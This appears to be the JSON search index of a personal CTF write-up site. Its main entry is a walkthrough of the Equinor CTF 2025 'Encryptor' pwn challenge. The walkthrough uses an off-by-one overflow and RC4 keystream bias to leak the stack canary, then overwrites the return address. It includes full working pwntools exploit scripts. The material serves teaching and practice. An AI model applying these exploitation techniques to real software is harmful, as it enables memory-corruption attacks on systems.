
[{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/","section":"","summary":"","title":"","type":"page"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/tags/bias/","section":"Tags","summary":"","title":"Bias","type":"tags"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/topics/crypto/","section":"Topics","summary":"Cryptography challenges, attacks, and implementations.","title":"Crypto","type":"topics"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/ctfs/","section":"Ctfs","summary":"","title":"Ctfs","type":"ctfs"},{"content":" Grab your resident cryptographer and try our shiny new Encryption-As-A-Service!\nncat --ssl encryptor-pwn.ept.gg 1337 The challenge provides a single ELF binary, encryptor, which exposes a menu-driven encryption service. On startup, it helpfully leaks the address of a forbidden function.\nWelcome to the EPT encryptor! Please behave yourself, and remember to stay away from a certain function at 0x55da2f7324f0! 1. Encrypt a message 2. Reset the key and encrypt again 3. Change offset 4. Exit \u0026gt; Despite PIE being enabled, the address of win() is printed on startup, removing the need for a separate code pointer leak.\nBinary protections # All standard mitigations are enabled.\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Reverse engineering # Encryption logic # Menu option 1 allows the user to encrypt an arbitrary string.\nif (menu_choice == 1) { printf(\u0026#34;Enter string to encrypt\\n\u0026gt; \u0026#34;); fgets(local_108, 242, stdin); RC4(key, local_108 + local_18, local_1f8, local_108 + local_18); puts_hex(local_1f8); resetKey(); } Two issues immediately stand out:\nfgets() reads 242 bytes into a 240-byte buffer The RC4 input pointer is offset by a stack variable local_18 Relevant stack layout:\nuchar local_1f8[240]; // ciphertext char local_108[240]; // user input Because fgets() writes a trailing null byte, this results in a 1-byte overflow past local_108, corrupting the least significant byte of local_18.\nDisabled offset control # There is a menu option intended to change this offset:\n\u0026gt; 3 Sorry, offset function disabled due to abuse! However, since local_18 is stored directly after the input buffer, the off-by-one overwrite allows us to modify it anyway. This gives indirect control over where RC4 reads plaintext from on the stack.\nStack layout and target # The relevant portion of the stack frame looks like this:\n[ user input buffer ] 240 bytes [ offset variable ] 1 byte (LSB controllable) [ padding ] [ stack canary ] 8 bytes [ saved rbp ] 8 bytes [ return address ] 8 bytes By adjusting the RC4 input offset, we can cause RC4 to encrypt arbitrary stack bytes, including the stack canary.\nRC4 keystream bias # RC4 is a stream cipher that generates a keystream K and encrypts via XOR:\n$$ C = P \\oplus K $$\nRC4 is known to exhibit statistical biases in its early output bytes. In particular, the second keystream byte is biased toward zero with probability:\n$$ \\Pr[K_2 = 0] = \\frac{1}{128} $$\ninstead of the uniform 1/256.\nThis enables a distinguishing attack: if the plaintext byte is constant across encryptions with fresh keys, the most frequent ciphertext byte converges to the plaintext value.\nCanary leakage via bias # We exploit this by:\nForcing RC4 to encrypt a chosen stack byte Aligning that byte with keystream index 2 Repeating encryption with fresh random keys Taking the most frequent ciphertext byte On amd64, the first byte of the stack canary is always 0x00, so only the remaining 7 bytes need to be recovered.\nCanary recovery script # Below is the core logic used to recover the canary one byte at a time.\nfrom pwn import * elf = ELF(\u0026#34;encryptor\u0026#34;) p = process(elf.path) p.recvline() win_addr = int(p.recvline().split(b\u0026#34;at \u0026#34;)[1][2:-1], 16) canary = [0x00] for i in range(1, 8): counts = {j: 0 for j in range(256)} # craft input so the RC4 plaintext pointer lands on canary[i] payload = (b\u0026#34;\\x00\u0026#34; * 240 + p8(0xf7 + i))[:241] p.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;1\u0026#34;) p.sendafter(b\u0026#34;\u0026gt;\u0026#34;, payload) while True: p.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;2\u0026#34;) ct = bytes.fromhex( p.recvline().split(b\u0026#34;Encrypted: \u0026#34;)[1].decode() ) counts[ct[1]] += 1 best = max(counts, key=counts.get) second = sorted(counts.values())[-2] if counts[best] - second \u0026gt; 5: canary.append(best) break canary = bytes(canary) log.success(f\u0026#34;canary = {canary.hex()}\u0026#34;) Notes:\nOnly the least significant byte of the offset is controlled Keystream index 2 is targeted because its bias is strongest The threshold is heuristic and may need tuning on remote Example output:\ncanary = 6f28c7b1a4923e00 ret2win # The binary contains a hidden menu option:\nif (menu_choice == 1337) { printf(\u0026#34;Leaving already? Enter feedback:\\n\u0026gt; \u0026#34;); fgets(local_108, 288, stdin); } This reads 288 bytes into a 240-byte buffer, allowing full control of the return address.\nWith the stack canary known and win() already leaked, exploitation is trivial.\nFinal payload # p.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;1337\u0026#34;) p.sendlineafter( b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;A\u0026#34; * 0xf8 + canary + b\u0026#34;B\u0026#34; * 8 + p64(win_addr) ) p.interactive() Successful execution:\nEPT{test_flag} Final solve script # Below is the consolidated exploit used locally and remotely.\nfrom pwn import * elf = ELF(\u0026#34;encryptor\u0026#34;) p = process(elf.path) p.recvline() win_addr = int(p.recvline().split(b\u0026#34;at \u0026#34;)[1][2:-1], 16) canary = [0x00] for i in range(1, 8): counts = {j: 0 for j in range(256)} payload = (b\u0026#34;\\x00\u0026#34; * 240 + p8(0xf7 + i))[:241] p.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;1\u0026#34;) p.sendafter(b\u0026#34;\u0026gt;\u0026#34;, payload) while True: p.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;2\u0026#34;) ct = bytes.fromhex( p.recvline().split(b\u0026#34;Encrypted: \u0026#34;)[1].decode() ) counts[ct[1]] += 1 best = max(counts, key=counts.get) second = sorted(counts.values())[-2] if counts[best] - second \u0026gt; 5: canary.append(best) break canary = bytes(canary) p.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;1337\u0026#34;) p.sendlineafter( b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;A\u0026#34; * 0xf8 + canary + b\u0026#34;B\u0026#34; * 8 + p64(win_addr) ) print(p.recvall().decode()) Takeaways # RC4 remains exploitable even outside traditional network protocols Single-byte overwrites are often sufficient to defeat stack canaries Cryptographic bias can be weaponized as an information leak Disabling functionality does not remove its security impact This challenge is a good example of cryptographic weaknesses amplifying memory corruption rather than replacing it.\n","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/ctfs/ept-25/encryptor/","section":"Ctfs","summary":"Leaking a stack canary using RC4 keystream bias, then ret2win.","title":"Encryptor","type":"ctfs"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/ctfs/ept-25/","section":"Ctfs","summary":"","title":"Equinor CTF 2025","type":"ctfs"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/topics/pwn/","section":"Topics","summary":"Binary exploitation and memory corruption challenges.","title":"Pwn","type":"topics"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/tags/rc4/","section":"Tags","summary":"","title":"Rc4","type":"tags"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/tags/stack-canary/","section":"Tags","summary":"","title":"Stack-Canary","type":"tags"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/tags/stream-cipher/","section":"Tags","summary":"","title":"Stream-Cipher","type":"tags"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/topics/","section":"Topics","summary":"Browse writeups by category.","title":"Topics","type":"topics"},{"content":"Hey, I\u0026rsquo;m Frederik. I publish CTF writeups and technical notes here.\nFocus\nBinary exploitation, crypto, reverse engineering, and web security CTFs, security research, and writeups worth sharing ","externalUrl":null,"permalink":"/writeup-page/about/","section":"About","summary":"Who I am, where to find me, and what I enjoy breaking.","title":"About","type":"about"},{"content":"","externalUrl":null,"permalink":"/writeup-page/topics/ctfs/","section":"Topics","summary":"Writeups grouped by competition.","title":"CTFs","type":"topics"},{"content":"","externalUrl":null,"permalink":"/writeup-page/topics/rev/","section":"Topics","summary":"Reverse engineering challenges and program analysis.","title":"Rev","type":"topics"},{"content":"","externalUrl":null,"permalink":"/writeup-page/topics/web/","section":"Topics","summary":"Web exploitation, logic bugs, and application vulnerabilities.","title":"Web","type":"topics"}]